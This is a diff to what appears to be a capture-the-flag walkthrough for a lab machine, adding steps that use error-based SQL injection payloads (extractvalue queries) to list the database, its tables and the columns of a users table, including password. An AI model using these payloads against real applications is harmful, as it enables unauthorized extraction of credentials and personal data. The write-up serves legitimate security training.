@@ -86,15 +86,30 @@ Machine IP: 10.10.10.113 - Debian
   - Extract: Version information.
   - Query: `') and extractvalue(0x0a,concat(0x0a,version()))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229354803-2b283325-cc0c-4561-bceb-4a890f1a6e1d.png)
+ ## Database Name 
   - Extract: Database name.
   - Query: `') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229359923-16a7107b-f98b-4294-8816-c672d7690dd6.png)
-  - Extract: Table Names
+ ## Tables
+  - Extract: Table names in the database `redcross`.
   - Query (Table 1): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 0,1)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229360263-2a8cfc98-5fb3-4d9b-ab61-71836b0aae34.png)
   - Query (Table 2): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 1,1)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229360434-d3ce41fa-586c-430a-b4f7-89549b2704e1.png)  
   - Query (Table 3): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 2,1)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229360478-52232c71-b380-404e-a649-e99f5afa4759.png)
+- Tables Found: messages, requests and users.
 
+## Columns
+  - Extract: Column names in the table `users`.
+  - Query (Column 1): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 0,1)))-- -`.
+![image](https://user-images.githubusercontent.com/83878909/229364114-7403598b-a0f4-463b-9ede-5933269491f1.png)
+  - Query (Column 2): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 1,1)))-- -`.
+![image](https://user-images.githubusercontent.com/83878909/229364190-97f1d230-b4a4-45d8-900a-50c7707eb9fd.png)
+  - Query (Column 3): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 2,1)))-- -`.
+![image](https://user-images.githubusercontent.com/83878909/229364271-a10fe1c5-7311-4d04-9c64-96141184e967.png)
+  - Query (Column 4): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 3,1)))-- -`.
+ ![image](https://user-images.githubusercontent.com/83878909/229364340-20cdc2a5-11c2-4abf-8548-542a58d86057.png)
+  - Query (Column 5): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 5,1)))-- -`.
 
+- Columns Found: id, username, password, mail and role.
